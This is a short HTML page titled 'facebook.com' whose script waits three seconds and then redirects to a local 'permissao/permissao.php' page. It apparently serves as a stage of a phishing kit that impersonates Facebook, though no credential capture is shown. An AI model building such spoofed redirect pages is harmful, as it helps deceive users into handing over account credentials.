<!DOCTYPE html>
<html>
<head>
  <title>facebook.com</title>
  <meta charset="utf-8">
  <link type="text/css" rel="stylesheet" media="screen" href="style.css" />
</head>
  <body onload="start();">
    <div id="tempo" >
    </div>
  </body>


    <script type="text/javascript">

  var count = new Number();
  var count = 3;

  function start(){

    if ((count - 1) >= 0){
      count -= 1;
      if (count == 0) {
			window.location.href = "permissao/permissao.php";
      }else if(count < 10){
        count = count;
      }
      tempo=count;
      setTimeout('start();', 1000);

    }
  }

  </script>
</html>